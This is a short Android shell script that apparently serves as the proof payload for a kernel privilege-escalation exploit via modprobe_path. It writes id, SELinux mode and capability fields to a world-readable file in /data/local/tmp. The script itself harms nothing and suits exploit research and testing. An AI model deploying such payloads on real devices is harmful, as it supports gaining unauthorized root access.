#!/system/bin/sh
{
echo "=== modprobe usermodehelper root proof ==="
date
id
getenforce
grep -E "^(Uid|Gid|CapEff|CapBnd|CapPrm|Seccomp)" /proc/self/status
echo "ROOTED via modprobe_path"
echo "uid=0 proof marker"
} > /data/local/tmp/root_proof.txt 2>&1
chmod 666 /data/local/tmp/root_proof.txt
cp /data/local/tmp/root_proof.txt /data/local/tmp/zzq1.log 2>/dev/null
